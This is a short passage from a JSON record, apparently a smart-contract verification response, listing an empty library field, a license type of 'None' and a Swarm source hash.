ments":"","Library":"","LicenseType":"None","SwarmSource":"bzzr://6490eb124efaad1fbf0797b74df2036dfb10228422b37d1b718a0e071783211a"}]}